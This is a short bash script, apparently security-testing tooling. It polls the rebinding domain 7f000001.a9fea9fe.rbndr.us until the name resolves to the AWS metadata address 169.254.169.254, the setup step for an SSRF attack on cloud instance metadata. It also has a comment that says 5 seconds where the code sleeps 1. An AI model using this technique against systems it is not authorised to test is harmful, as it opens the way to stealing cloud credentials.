#!/bin/bash

# Define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# DNS Rebind Attack simulation for AWS
echo -e "${YELLOW}Trying to use DNS Rebind Technique for AWS${RESET}"

TARGET_IP="169.254.169.254"
DOMAIN="7f000001.a9fea9fe.rbndr.us"
DNS_SERVER="8.8.8.8"

while true; do
    # Run nslookup and extract the last resolved IP address
    RESOLVED_IP=$(nslookup $DOMAIN $DNS_SERVER 2>/dev/null | awk '/^Address: / {print $2}' | tail -n1)

    # Check if the resolved IP matches the target
    if [[ "$RESOLVED_IP" == "$TARGET_IP" ]]; then
        echo -e "Success! ${DOMAIN} resolved to ${TARGET_IP}"
        break
    fi

    # Wait for 5 seconds before retrying
    sleep 1
done
